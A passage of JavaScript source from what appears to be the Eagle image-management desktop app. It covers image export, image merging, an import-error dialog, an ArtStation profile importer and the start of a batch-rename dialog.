                    if (fileNameCount[fileName]) {
                        fileNameCount[fileName]++;
                        fileName = `${fileName}_${fileNameCount[fileName]}`;
                    }
                    else {
                        fileNameCount[fileName] = 1;
                    }

                    let outputFormat;
                    if (format === "original") {
                        outputFormat = item.ext;
                    }
                    else {
                        outputFormat = format;
                    }

                    var mimeType;
                    switch (outputFormat) {
                        case "jpg":
                        case "jpeg":
                        case "jfif":
						case "jpe":
                            mimeType = `image/jpeg`;
                            outputPath = path.normalize(`${savePath}/${fileName}.jpg`);
                            break;
                        case "png":
                        case "webp":
                            mimeType = `image/${outputFormat}`;
                            outputPath = path.normalize(`${savePath}/${fileName}.${outputFormat}`);
                            break;
                        case "bmp":
                            mimeType = `image/bmp`;
                            outputPath = path.normalize(`${savePath}/${fileName}.bmp`);
                            break;
                        default:
                            mimeType = `image/jpeg`;
                            outputPath = path.normalize(`${savePath}/${fileName}.jpg`);
                    }

                    var imgChangeRatio = 1;
                    switch ($scope.resizeMethod) {
                        case "max-width":
                            if (pixel < item.width) {
                                imgChangeRatio = pixel / item.width;
                            }
                            break;
                        case "max-height":
                            if (pixel < item.height) {
                                imgChangeRatio = pixel / item.height;
                            }
                            break;
                        case "min-width":
                            if (item.width < pixel) {
                                imgChangeRatio = pixel / item.width;
                            }
                            break;
                        case "min-height":
                            if (item.height < pixel) {
                                imgChangeRatio = pixel / item.height ;
                            }
                            break;
                        case "max-long-edge":
                            var longEdge = Math.max(item.width, item.height);
                            if (pixel < longEdge) {
                                imgChangeRatio = pixel / longEdge;
                            }
                            break;
                        case "max-short-edge":
                            var minEdge = Math.min(item.width, item.height);
                            if (pixel < minEdge) {
                                imgChangeRatio = pixel / minEdge;
                            }
                            break;
                        default:
                            imgChangeRatio = 1;
                    }

                    if (index === 0) {
                        finishOpenPath = outputPath;
                    }

                    // 不需要改变，直接拷贝粘贴最快
                    if ( (quality === 100 && resizeMethod === 'original') && (format === 'original' || format === item.ext) ) {
                        // console.log("导出图片，使用原文件拷贝");
                        fse.copy(decodeURIComponent(getRawPath($bodyScope.imagesDir, item)), outputPath, { overwrite: true }, function (err) {
                            finishCallback(err);
                        });
                        return;
                    }

                    // console.log(`导出图片，格式：${format}，缩放：${resizeMethod}，尺寸：${imgChangeRatio}，质量：${quality}`);
                    image.onload = function() {
                        try {
                            canvasHelper.resize(image, {
                                toCropImgX: 0,
                                toCropImgY: 0,
                                toCropImgW: item.width,
                                toCropImgH: item.height,
                                imgChangeRatio: imgChangeRatio,
                                mimeType: mimeType,
                                quality: quality / 100
                            }, function (base64string) {
                                var buffer = decodeBase64Image(base64string).data;
                                fs.writeFile(outputPath, buffer, function (err) {
                                    finishCallback(null);
                                });
                            });
                        }
                        catch (err) {
                            finishCallback(null);
                        }
                    };

                    image.onerror = function() {
                        finishCallback(null);
                    };

                    image.src = rawPath;
                }
            });

            async.parallelLimit(cbs, 2, function(err, result) {
                $scope.isExporting = false;
                $scope.$evalAsync();
                ipcRenderer.send('show-item-in-folder', finishOpenPath);
                if (pixel > 0) {
                    localStorage.setItem("EXPORT_IMAGE_LAST_SIZE", pixel);
                }
                localStorage.setItem("EXPORT_IMAGE_LAST_FORMAT", $scope.format);
                localStorage.setItem("EXPORT_IMAGE_LAST_METHOD", $scope.resizeMethod);
                localStorage.setItem("EXPORT_IMAGE_LAST_QUALITY", $scope.quality);
                localStorage.setItem("EXPORT_IMAGE_LAST_RENAME", $scope.newName);
                localStorage.setItem("EXPORT_IMAGE_LAST_RENAME_METHOD", $scope.renameMethod);
            });

        });
    };

    $scope.focusShourtcut = function (event) {
        event && event.stopPropagation();
        $("#export-image-modal-shortcut").focus();
    };

    $scope.onKeyDown = function (event) {
        var keyCode = event.keyCode;
        if (keyCode === 27) {
            event.preventDefault();
            event.stopPropagation();
            $scope.cancel();
        }
        else if (keyCode === 13) {
            // if (event.metaKey || event.ctrlKey) {
                event.preventDefault();
                event.stopPropagation();
                $scope.export();
                $(event.target).blur();
            // }
        }
    }

    $scope.cancel = function() {
    	$scope.close();
    };

    $scope.cancelExport = function () {
        $scope.isCancelled = true;
        $scope.isExporting = false;
        $scope.close();
    }

    $scope.close = function () {
        $scope.isOpen = false;
    };

    $scope.$watch("[newName, startAt, renameMethod]", function () {
        if (!$scope.items[0]) return;
        updatePreview();
    });

    function updatePreview () {
        if ($scope.renameMethod !== 'original') {
            if ($scope.newName.length > 0) {
                var newName = formatFileName($scope.newName, {
                    idx: $scope.startAt
                });
                $scope.preview = `${newName}.${$scope.format}`;
            }
        } 
    }

    function formatFileName (name, options) {
        var idx = options.idx;
        var newName = name;
        try {
            if ($scope.items.length > 1) { 
                newName = sanitize(`${newName}${idx}`);
            }
            else {
                newName = sanitize(`${newName}`);
            }
        } catch (e) {
            if ($scope.items.length > 1) { 
                newName = sanitize(`${newName}${idx}`);
            }
            else {
                newName = sanitize(`${newName}`);
            }
        }
        return newName;
    };

});

EagleApp.controller("MergeImageController", function($scope, $timeout, $rootScope, $filter) {

    var ipcRenderer = require('electron').ipcRenderer;
    var mergeImages;

    $scope.mergeImageScope = $scope;
    $scope.isOpen = false;
    $scope.isMerging = false;
    $scope.removeWhenFinish = "false";

    if (localStorage.getItem("mergeImageRemoveWhenFinish") === "true") {
        $scope.removeWhenFinish = "true";
    }

    $scope.isVertical = "true";

    $scope.isAlignLeft = "false";
    $scope.isAlignRight = "false";
    $scope.isAlignCenter = "true";
    $scope.isAlignTop = "false";
    $scope.isAlignBottom = "false";

    $scope.width;
    $scope.height;
    $scope.margin = 0;

    $scope.isStretch = "true";

    $scope.$watch("isVertical", function () {
        if ($scope.isAlignCenter !== "true") {
            $scope.isAlignLeft = "false";
            $scope.isAlignRight = "false";
            $scope.isAlignCenter = "true";
            $scope.isAlignTop = "false";
            $scope.isAlignBottom = "false";
        }
    });

    $scope.onWidthBlur = function () {
        if (!$scope.width) {
            $scope.width = $scope.minWidth;
        }
        else if ($scope.width > $scope.maxWidth) {
            $scope.width = $scope.maxWidth;
        }
    };

    $scope.onHeightBlur = function () {
        if (!$scope.height) {
            $scope.height = $scope.minHeight;
        }
        else if ($scope.height > $scope.maxHeight) {
            $scope.height = $scope.maxHeight;
        }
    };

    $scope.$on("OPEN_MERGE_IMAGES", function(e, params) {

    	if (params.images && params.images.length > 0) {
	    	$scope.items = params.images;
	        $scope.isOpen = true;
            $scope.isMerging = false;

            if (params.orientation && params.orientation === 'horizontal') {
                $scope.isVertical = 'false';
            }
            // else {
            //     $scope.isVertical = 'true';
            // }

            // 重新计算推荐尺寸
            var minWidth = 99999999;
            var minHeight = 99999999;
            var maxWidth = -1;
            var maxHeight = -1;

            $scope.items.forEach(function (item) {
                if (item) {
                    if (item.width < minWidth) {
                        minWidth = item.width;
                    }
                    if (item.height < minHeight) {
                        minHeight = item.height;
                    }
                    if (item.width > maxWidth) {
                        maxWidth = item.width;
                    }
                    if (item.height > maxHeight) {
                        maxHeight = item.height;
                    }
                }
            });

            if (minHeight) {
                $scope.height = minHeight;
                $scope.minHeight = minHeight;
            }

            if (minWidth) {
                $scope.width = minWidth;
                $scope.minWidth = minWidth;
            }

            $scope.maxHeight = maxHeight;
            $scope.maxWidth = maxWidth;

            $timeout(function () {
                if ($scope.isVertical === 'false') {
                    $("#merge-image-height").focus();
                }
                else {
                    $("#merge-image-width").focus();
                }
            }, 300);
        }
    });

    $scope.switchOrientation = function () {
        if ($scope.isVertical === 'true') {
            $scope.isVertical = 'false';
            $timeout(function () {
                $("#merge-image-height").focus();
            }, 100);
        }
        else {
            $scope.isVertical = 'true';
            $timeout(function () {
                $("#merge-image-width").focus();
            }, 100);
        }
    }

    $scope.onKeydown = function(event) {
        var keyCode = event.keyCode;
        if (keyCode === 27) {
            event.stopPropagation();
            event.preventDefault();
            $scope.cancel();
        }
        else if (keyCode === 9) {
            event.stopPropagation();
            event.preventDefault();
            $scope.switchOrientation();
        }
        else if (keyCode === 13) {
            if (event.metaKey || event.ctrlKey) {
                event.stopPropagation();
                event.preventDefault();
                $(event.target).blur();
                $scope.save();
            }
        }
    };

    $scope.save = function () {

        var stretch = $scope.isStretch === 'true';
        var orientation = "vertical";
        var align = "center";

        if ($scope.isVertical !== 'true') {
            orientation = "horizontal";
        }

        if ($scope.isAlignLeft === "true") {
            align = "left"
        }
        else if ($scope.isAlignRight === "true") {
            align = "right"
        }
        else if ($scope.isAlignCenter === "true") {
            align = "center"
        }
        else if ($scope.isAlignTop === "true") {
            align = "top"
        }
        else if ($scope.isAlignBottom === "true") {
            align = "bottom"
        }

        if ($scope.margin <= 0) {
            $scope.margin = 0;
        }

        $scope.mergeImages($scope.items, { orientation: orientation, align: align, margin: $scope.margin, width: $scope.width, height: $scope.height, stretch: stretch });
        $scope.close();
    };

    $scope.cancel = function() {
    	$scope.close();
    };

    $scope.close = function () {
        $timeout(function () {
            $scope.left = undefined;
            $scope.right = undefined;
            $scope.duplicates = [];
            $scope.applyAll == 'false'
        }, 500);
        $scope.isOpen = false;
        $scope.isMerging = false;
    };

    $scope.mergeImages = function (selected, options) {

        if ($scope.isMerging) return;
        if (!selected || selected.length === 0) return;

        $scope.isMerging = true;
        let images = [];
        let tags = [];
        let url = "";
        let name = "";
        let hasPng = false;
        let inputImages = selected.filter(function (image) {
            return "jpg jpeg png gif webp avif".indexOf(image.ext) > -1;
        });

        if (inputImages.length === 0) return;
        var modificationTime = 0;
        var lastIndex = 99999999;
        inputImages.forEach(function (image) {
            var width = image.width;
            var height = image.height;
            if (image.ext === 'png' || image.ext === 'gif') {
                hasPng = true;
            }
            if (!name) { name = image.name };
            if (!url) { url = image.url };
            if (image.tags && image.tags.length > 0) {
                tags = tags.concat(image.tags);
            }

            // 如果需要拉伸
            if (options.stretch) {
                if (options.orientation === 'vertical' && options.width) {
                    var ratio = image.width / options.width;
                    width = options.width;
                    height = parseInt(image.height / ratio);
                }
                if (options.orientation === 'horizontal' && options.height) {
                    var ratio = image.height / options.height;
                    height = options.height;
                    width = parseInt(image.width / ratio);
                }
            }

            // var idx = $bodyScope.allData.indexOf(image);
            // if (idx < lastIndex) {
            //     lastIndex = idx;
            //     modificationTime = image.modificationTime + 1;    
            // }
            var currentFolderId = $bodyScope.currentFolder && $bodyScope.currentFolder.id;
            var imodt = _.get(image, `order[${currentFolderId}]`, image.modificationTime);
            if (imodt > modificationTime) {
                modificationTime = imodt + 1;
            }

            images.push({
                width: width,
                height: height,
                name: decodeURIComponent(getRawPath($scope.imagesDir, image))
            });
        });

        tags = [...new Set(tags)];

        if (!fs.existsSync(EAGLE_THUMBNAIL_TEMP_PATH)) {
            fs.mkdirSync(EAGLE_THUMBNAIL_TEMP_PATH, 0755);
        }

        var newImage = {
            id: guid(),
            name: inputImages[0].name || "",
            ext: (hasPng)? 'png' : 'jpg',
            type: (hasPng)? 'png' : 'jpg',
            tags: tags || [],
            url: url || "",
            modificationTime: modificationTime || Date.now(),
            merged: true,
        }

        newImage.path = `${EAGLE_THUMBNAIL_TEMP_PATH}/${newImage.id}.${newImage.ext}`;
        electronLog && electronLog.info(`[app] Combine ${images.length} images, orientation: ${options.orientation}, align: ${options.align}`);
        if (!mergeImages) {
            mergeImages = require(appRoot + '/my_modules/merge-images');
        }
        mergeImages({
            images: images,
            output: `${EAGLE_THUMBNAIL_TEMP_PATH}/${newImage.id}`,
            orientation: options.orientation || 'vertical',
            align: options.align || 'center',
            margin: options.margin || 0,
            format: newImage.ext
        }, (err) => {
            $scope.isMerging = false;
            if (err) {
                dialog.showErrorBox(i18n.__("Dialog.MergeImages.Error.Title"), err && err.toString());
                electronLog && electronLog.error(`${newImage.path}`);
                electronLog && electronLog.error(err.stack || err);
            }
            else {
                $scope.uploadFiles([newImage], $scope.currentFolder);
                if ($scope.removeWhenFinish === 'true') {
                    inputImages.forEach(function(image) {
                        image.isDeleted = true;
                        image.deletedTime = Date.now();
                    });
                    ayncsImagesChange(inputImages);
                }
                $scope.$evalAsync();
                localStorage.setItem("mergeImageRemoveWhenFinish", $scope.removeWhenFinish);
                if (selected.length != inputImages.length) {
                    var message = $filter('i18n')("Dialog.MergeImages.Tips.Descript", [
                        { "property": "count", "value": selected.length - inputImages.length }
                    ]);
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__("Dialog.MergeImages.Tips.Title")}</h4>
                                <p class="alert-desc">${message}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("Dialog.MergeImages.Tips.Close"),
                    }).then(function () {});   
                }
            }
        });
    };
});

EagleApp.controller("ErrorModalController", function($scope, $timeout, $rootScope, $filter) {

    var ipcRenderer = require('electron').ipcRenderer;
    $scope.isOpen = false;
    rootScope = angular.element("body").scope();

    $scope.errorList = [];

    $scope.$on("OPEN_ERROR", function(e, params) {
        $scope.errorList = params.errorList;
        $scope.isOpen = true;
    });

    $scope.$on("CLEAN_ALL_ERROR", function(e, params) {
        $scope.errorList = params.errorList;
        $scope.cleanAll();
    });

    // 移除失敗任務
    $scope.remove = function (task) {
        var idx = $scope.errorList.indexOf(task);
        if (idx > -1) {
            $scope.errorList.splice(idx, 1);
        }
    };

    $scope.openPath = function (filePath) {
        if (filePath) {
            ipcRenderer.send('show-item-in-folder', path.normalize(filePath));
        }
    };

    // 全部重试
    $scope.retryAll = function () {

        var urlFiles = [];
        var localFiles = [];
        $scope.errorList.forEach(function (error) {
            if (error.type === 'DOWNLOAD_ERROR') {
                $scope.uploadQueue.push({});
                urlFiles.push({
                    id: guid(),
                    url: error.object.url,
                    folders: error.object.folders || [],
                    tags: error.object.tags || [],
                    type: error.object.type || undefined,
                    name: error.object.name,
                    website: error.object.website || "",
                    modificationTime: error.object.modificationTime
                });
            }
            else if (error.type === 'ADD_ERROR') {
                localFiles.push({
                    id: guid(),
                    path: error.object.path,
                    lastModified: Date.now(),
                    folders: error.object.folders || [],
                    tags: error.object.tags || [],
                    type: error.object.type || undefined,
                    name: error.object.name,
                    website: error.object.website || "",
                    modificationTime: error.object.modificationTime
                });
            }
            else if (error.type === 'EDIT_ERROR') {
                try {
                    if (error.modifiedData && error.modifiedData.id) {
                        var item = rootScope.itemMappings[error.modifiedData.id];
                        if (item) {
                            angular.extend(item, error.modifiedData);
                            rootScope.updateItemView(item);
                            rootScope.updateSelection();
                            rootScope.$evalAsync();
                            ayncsImagesChange([item]);
                        }
                    }
                }
                catch (err) {}
            }
        });

        if (urlFiles.length > 0) {
            ipcRenderer.send('upload-urls', urlFiles);
        }

        if (localFiles.length > 0) {
            var $bodyScope = angular.element("body").scope();
            $bodyScope.uploadFiles(localFiles);
        }

        $scope.errorList.length = 0;
        $scope.close();
    };

    $scope.copyAll = function () {
        let paths = [];
        $scope.errorList.forEach(function (error) {
            if (error.object.path) {
                paths.push(error.object.path);
            }
        });
        ipcRenderer.sendTo(backgroundWindowID, 'copy-paths-to-clipboard', paths);
        $bodyScope.notify({
            message: $filter('i18n')("previewWindow.copied"),
            duration: 1000
        });
    };

    // 清空所有任务并关闭
    $scope.cleanAll = function () {
        swal({
            html: `
                <div class="alert">
                    <div class="alert-icon warning"></div>
                    <h4 class="alert-title">${i18n.__("dialog.importErrorRemoveAll.title")}</h4>
                    <p class="alert-desc">${i18n.__("dialog.importErrorRemoveAll.desc")}</p>
                </div>
            `,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            cancelButtonColor: "#777777",
            confirmButtonText: i18n.__("dialog.importErrorRemoveAll.button"),
            cancelButtonText: i18n.__("general.cancel"),
        }).then(function () {
            $scope.errorList.length = 0;
            $scope.close();
            $scope.$evalAsync();
        });
    };

    $scope.close = function () {
        $scope.isOpen = false;
    };
});

var Artstation = {
    // 是否为支持网址
    isValidUrl: (url) => {
        return url.indexOf("www.artstation.com/") > -1;
    },
    // 取得 artstation 用户名称
    getUserNameFromUrl: (url, urlPattern) => {
        var name = url.split(urlPattern)[1];
        var queryIdx = name.indexOf("?");
        if (queryIdx > -1) {
            name = name.slice(0, queryIdx);
        }
        return name.replace("/", "");
    },
    // 取得用户信息
    getUserInfo : (url, callback) => {
        if (!Artstation.isValidUrl(url)) {
            finishCallback({
                msg: '网址格式错误'
            }, null);
        }
        // var userName = getArtstationUserNameFromUrl("https://www.artstation.com/minskuju?a=123", "https://www.artstation.com/");
        var userName = Artstation.getUserNameFromUrl(url, "https://www.artstation.com/");
        if (!userName) {
            callback({
                msg: '用户名称错误'
            }); 
        }
        // 取得用户图片总数
        $.getJSON("https://www.artstation.com/users/" + userName + "/projects.json?page=99999", (data) => {
            if (!data || data.total_count === 0) {
                callback({
                    msg: '无法获取该用户信息'
                }); 
            }
            callback(null, {
                url: url,
                userName: userName,
                total: data.total_count
            });
        });
    },
    getUserProjects : (params, updateCallback, finishCallback) => {

        var total = params.total;
        var url = params.url;
        var userName = params.userName;
        var pageCount = Math.ceil(total / 50);
        
        // 一页一页开始获取 JSON，每获取一次，呼叫 updateCallback
        // 所有页面完成后，呼叫 finishCallback
        // var downloadQueue = async.queue(async.timeout(writeLibraryQueueCallback, 10000), 5);
        var urls = [];
        var done = 0;
        for (var i = 0; i < pageCount; i++) {
            urls.push("https://www.artstation.com/users/" + userName + "/projects.json?page=" + (i + 1));
        }

        var cbs = urls.map(function(url, index) {
            return function(callback) {
                $.getJSON(url, (data) => {
                    if (data) {
                        // https get json
                        updateCallback(null, data.data);
                        callback(null, data.data);
                    }
                    else {
                        callback({
                            msg: "无法取得结果"
                        });
                    }
                });
            }
        });

        var getVideoSrcFromIframe = async function (asset) {
            return new Promise(resolve => {
                var iframeSrc = $(asset.player_embedded).attr("src");
                fetch(iframeSrc).then(function (response) {
                    return response.text();
                }).then(function (data) {
                    try {
                        var parser = new DOMParser();
                        var doc = parser.parseFromString(data, 'text/html'); 
                        var iframeVideoElem = $(doc).find("source");
                        if (iframeVideoElem[0].src.indexOf("mp4")) {
                            resolve(iframeVideoElem[0].src);
                        }
                        else {
                            resolve();
                        }
                    } catch (err) {
                        resolve();    
                    }
                }).catch(function (err) {
                    resolve();
                });
            });
        };

        const parseAsset = async function (item, raw, images, cb) {
            var assets = raw.assets;
            for (var i = 0; i < assets.length; i++) {

                let asset = assets[i];

                if (asset.width > 2560 || asset.height > 2560) {
                    if (asset.image_url.indexOf("covers") === -1 && asset.image_url.indexOf("video") === -1) {
                        asset.image_url = asset.image_url.replace("/large/", "/4k/");
                    }
                }

                if (asset.oembed && asset.oembed.provider_name === "ArtStation" && asset.player_embedded && asset.player_embedded.indexOf("artstation.com") > -1) {
                    let videoUrl = await getVideoSrcFromIframe(asset);
                    asset.image_url = videoUrl || asset.image_url;
                }

                images.push({
                    id: asset.id,
                    width: asset.width,
                    height: asset.height,
                    link: item.permalink,
                    title: item.title.replace(/%/g, "").replace(/[:|"<>,.^&*?//-]+/g, '').substr(0, 36),
                    src: asset.image_url,
                    projectIndex: raw.id,
                    assetIndex: asset.position
                });
            }
            cb();
        }

        var async = require('async');
        async.parallelLimit(cbs, 20, function(err, result) {

            if (!result || result.length === 0) {
                finishCallback({
                    msg: "下载失败"
                });
            }

            // 正规划图片格式
            var images = [];
            result.forEach(function (data) {
                data.forEach(function (item, projectIndex) {
                    $.getJSON('https://www.artstation.com/projects/' + item.hash_id + '.json', function (raw) {
                        parseAsset(item, raw, images, function () {
                            done++;
                            if (done === total) {
                                // images = images.reverse();
                                images = images.sort(function (a, b) {
                                    if (a.projectIndex === b.projectIndex) {
                                        return b.assetIndex - a.assetIndex;
                                    }
                                    else {
                                        if (a.projectIndex < b.projectIndex)
                                            return -1;
                                        if (a.projectIndex > b.projectIndex)
                                            return 1;
                                    }
                                });
                                finishCallback(err, images, result.length);
                            }
                        });
                    });
                });
            });
        });
    }
};

// 下载 artstation 网址包含的图片
// var url = "https://www.artstation.com/haryarti";
// var downloadCount = 0;
// console.info("下载网址：" + url);
// Artstation.getUserInfo(url, (err, result) => {

//     if (err) { console.log(err); return; }

//     console.info("用户 %s 拥有 %d 张图片", result.userName, result.total);
//     Artstation.getUserProjects({
//         total: result.total,
//         userName: result.userName,
//         url: result.url
//     }, (err, images) => {
//         if (err) return;
//         downloadCount += images.length;
//         console.info("下载进度 %d / %d", downloadCount, result.total);
//     }, (err, result) => {
//         console.info("下载完成，共下载了 %d 张图片", downloadCount);
//         console.log(result);
//     });
// });
EagleApp.directive('artstationImportModal', function ($timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/artstation-import-modal.html',
        scope: {},
        link: function ($scope, element, attrs, controllersArr) {

            let ipcRenderer = require('electron').ipcRenderer;
            let $appScope = angular.element("body").scope();

            $scope.artStationScope = $scope;
            $scope.importFolders = [];
            $scope.pageUrl = "";
            $scope.isOpen = false;
            $scope.isLoading = false;
            $scope.current = 0;

            $scope.close = function() {
                $scope.isOpen = false;
                $scope.isLoading = false;
                $scope.total = 0;
                $scope.current = 0;
            };

            $scope.selectFolders = function ($event) {

                const folders = $bodyScope.folders;
                let originalSelectedIds = $scope.importFolders.reduce((map, folder) => {
                    map[folder.id] = true;
                    return map;
                }, {});
                FolderSelectPanel.open({
                    folders: folders,
                    selectedIds: originalSelectedIds,
                    onChanged: (result) => {
                        if (!result?.isDirty) return;
        
                        const { selectedFolderIds, deselectedFolderIds } = result;
        
                        $scope.importFolders = [];
                        Object.keys(selectedFolderIds).forEach((id) => {
                            let folder = $appScope.folderMappings[id];
                            if (folder) {
                                $scope.importFolders.push(folder);
                            }
                        });
                        $scope.$evalAsync();
                    }
                });
            };

            $scope.createNewFolder = function (title) {
                var folder = {
                    id: guid(),
                    name: title,
                    tags: [],
                    images: [],
                    children: [],
                    modificationTime: Date.now(),
                    imagesMappings: {},
                    isExpand: true,
                    description: `${$scope.pageUrl}`
                };
                $appScope.folders.push(folder);
                $appScope.folderMappings[folder.id] = folder;
                $appScope.updateSidebarList();
                $appScope.calculateImageBinding();
                $appScope.saveFolder();
                return folder;
            }

            $scope.getFolderNames = function () {
                if ($scope.importFolders.length === 0) return i18n.__("modal.artstation.defaultFolder");
                return $scope.importFolders.map(function (fd) { return fd.name; }).join(",");
            };

            function open() {
                $scope.importFolders = [];
                $scope.current = 0;
                $scope.total = 0;
                $timeout(function() {
                    
                    $scope.isOpen = true;
                    setTimeout(function () {
                        $("#artstation-url").focus().select();
                    }, 300);
                }, 300);
            };

            $scope.$on('IMPORT_ARTSTATION', function (e) {
                open();
            });

            ipcRenderer.on("import-artstation", function(e) {
                open();
                $scope.$evalAsync();
            });

            $scope.vaildateUrl = function() {
                if (!$scope.pageUrl) return;
                if (!Artstation.isValidUrl($scope.pageUrl)) {
                    $scope.urlError = true;
                }
                else {
                    if (!$scope.pageUrl.match(/^[a-zA-Z]+:\/\//)) {
                        $scope.pageUrl = "https://" + $scope.pageUrl;
                    }
                    $scope.urlError = false;
                }
                return $scope.urlError;
            };

            $scope.importUrl = function() {
                if (!$scope.pageUrl) return;
                if ($scope.isLoading) return;
                if ($scope.vaildateUrl()) return;

                $scope.isLoading = true;

                // 修改 refer 避免图片呈现不出来
                var refer = $scope.pageUrl.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i) && $scope.pageUrl.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i)[0];
                remote.require('electron-referer')(refer, remote.getCurrentWindow());

                // var url = "https://www.artstation.com/rodionvlasov";
                $scope.current = 0;
                console.info("下载网址：" + $scope.pageUrl);
                Artstation.getUserInfo($scope.pageUrl, (err, result) => {

                    if (err) { 
                        console.log(err); return; 
                    }

                    $scope.current = 0;
                    $scope.total = result.total;
                    $scope.userName = result.userName;
                    $scope.$evalAsync();

                    console.info("用户 %s 拥有 %d 张图片", result.userName, result.total);

                    Artstation.getUserProjects({
                        total: result.total,
                        userName: result.userName,
                        url: result.url
                    }, (err, images) => {
                        if (err) return;
                        $scope.current += images.length;
                        console.info("下载进度 %d / %d", $scope.current, result.total);
                        $scope.$evalAsync();
                    }, (err, result) => {
                        console.info("下载完成，共下载了 %d 张图片", $scope.current);
                        console.log(result);
                        $scope.isLoading = false;
                        $scope.import({
                            title: $scope.userName,
                            images: result
                        });
                        $scope.$evalAsync();
                    });
                });
            };

            $scope.importUrlManual = function() {
                if (!$scope.pageUrl) return;
                if ($scope.isLoading) return;
                if ($scope.vaildateUrl()) return;

                $scope.isLoading = true;

                // 修改 refer 避免图片呈现不出来
                var refer = $scope.pageUrl.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i) && $scope.pageUrl.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i)[0];
                remote.require('electron-referer')(refer, remote.getCurrentWindow());

                // var url = "https://www.artstation.com/rodionvlasov";
                $scope.current = 0;
                console.info("下载网址：" + $scope.pageUrl);
                Artstation.getUserInfo($scope.pageUrl, (err, result) => {

                    if (err) { 
                        console.log(err); return; 
                    }

                    $scope.current = 0;
                    $scope.total = result.total;
                    $scope.userName = result.userName;
                    $scope.$evalAsync();

                    console.info("用户 %s 拥有 %d 张图片", result.userName, result.total);

                    Artstation.getUserProjects({
                        total: result.total,
                        userName: result.userName,
                        url: result.url
                    }, (err, images) => {
                        if (err) return;
                        $scope.current += images.length;
                        console.info("下载进度 %d / %d", $scope.current, result.total);
                        $scope.$evalAsync();
                    }, (err, result) => {
                        console.info("下载完成，共下载了 %d 张图片", $scope.current);
                        console.log(result);
                        $scope.isLoading = false;

                        var title = $scope.userName;
                        var images = [];

                        result.forEach(function (img) {

                            var image = {
                                title: img.title,
                                src: img.src,
                                url: img.link || $scope.pageUrl,
                                type: $scope.getImageType(img.src),
                                width: img.width || 200,
                                height: img.height || 200,
                                type: "image"
                            };

                            images.push(image);
                        });

                        let importFolders = $scope.importFolders;
                        if (importFolders.length === 0) {
                            let newFolder = $scope.createNewFolder($scope.userName);
                            importFolders = [newFolder];
                        }

                        $rootScope.$broadcast("IMPORT_IMAGES", {
                            title: $scope.userName,
                            url: $scope.pageUrl,
                            images: images,
                            importFolders: importFolders
                        });

                        $scope.close();
                        $scope.$evalAsync();
                    });
                });
            };

            $scope.getImageType = function (link) {
                if (link.indexOf(".png") > -1) {
                    return 'png';
                }
                else {
                    return 'jpg';
                }
            }

            $scope.urlKeydown = function(event) {
                var keyCode = event.keyCode;
                if (keyCode === 27) {
                    $scope.close();
                }
                else if (keyCode === 13) {
                    if (event.metaKey || event.ctrlKey) {
                        $(event.target).blur();
                        $scope.importUrl();
                    }
                }
            };

            $scope.import = function(params) {

                if ($scope.isLoading) return;

                if (!params.title) {
                    return;
                }

                $scope.isLoading = true;

                var images = params.images;

                if (images.length > 0) {
                    
                    var names = [];
                    var tags = [];
                    var types = []
                    var originals = [];
                    var imageUrls = [];
                    images.forEach(function(image) {
                        imageUrls.push(image.src);
                        names.push(image.title.replace(/%/g, "").replace(/[:|"<>,.^&*?//-]+/g, '').substr(0, 36) || guid());
                        originals.push(image.link || $scope.pageUrl);
                        $appScope.uploadQueue.push({});
                    });

                    let selectedFolderIds = [];
                    if ($scope.importFolders.length === 0) {
                        let newFolder = $scope.createNewFolder($scope.userName);
                        selectedFolderIds = [newFolder.id];
                    }
                    else {
                        selectedFolderIds = $scope.importFolders.map(function (fd) {
                            return fd.id;
                        });
                    }

                    if (selectedFolderIds[0]) {
                        $appScope.openFolder($appScope.folderMappings[selectedFolderIds[0]]);
                    }
                    
                    $appScope.addToRecentFolders(selectedFolderIds);
                    $appScope.uploadUrls(imageUrls, selectedFolderIds, {
                        names: names,
                        urls: originals,
                        tags: tags
                    });

                    electronLog.info(`[app] Import Artstation link: ${$scope.pageUrl}，total: ${imageUrls.length} links`);
                    analytics.event('Artstation', 'Import', $scope.pageUrl);
                }

                $scope.close();
                $scope.$evalAsync();
            };
        }
    }
});
EagleApp.directive('batchRenameModal', function ($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/batch-rename-modal.html',
        scope: {},
        link: function ($scope, element, attrs, controllersArr) {

            $scope.isOpen = false;
            $scope.isRenaing = false;
            $scope.startAt = 1;
            $scope.previews = [];
            $scope.newName = "";

            $scope.findString = "";
            $scope.replaceString = "";
            $scope.replaceMethod = "format";

            $scope.type = "";   // IMAGE, FOLDER, TAG, SMART_FOLDER
            $scope.items;

            $scope.$on("OPEN_RENAME", (e, params) => {

                $scope.type = params.type;
                switch ($scope.type) {
                    case "IMAGE":
                        $scope.items = params.images;
                        $scope.newName = `${i18n.__('general.untitled.newName')} - %N`;
                        if (localStorage.getItem("BATCH_RENAME_LAST_NAME")) {
                            $scope.newName = localStorage.getItem("BATCH_RENAME_LAST_NAME");
                        }
                        break;
                    case "FOLDER":
                    case "SMART_FOLDER":
                        $scope.items = params.folders;
                        $scope.newName = `${i18n.__('general.untitled.newName')} - %N`;
                        break;
                    case "TAGS":
                        $scope.items = params.tags;
                        $scope.newName = `*`;
                        break;
                }

                if ($scope.items && $scope.items.length) {
                    $scope.isOpen = true;
                    $scope.isRenaing = false;
                    $scope.updatePreview();
                    setTimeout(function () {
                        $(".batch-rename-modal input[type='text']").first().focus();
                    }, 200);
                }
            });

            // 監聽名稱、開始編號
            $scope.$watch("[newName, startAt]", () => {
                if (!is.number($scope.startAt)) { $scope.startAt = 1; }
                if ($scope.startAt < 0) { $scope.startAt = 0; }
                $scope.updatePreview();
            });

            // 監聽取代字串
            $scope.$watch("[findString, replaceString]", () => {
                try {
                    $scope.regex = createRegexFromString($scope.findString);
                    $scope.isRegex = true;
                } catch (e) {
                    $scope.isRegex = false
                }
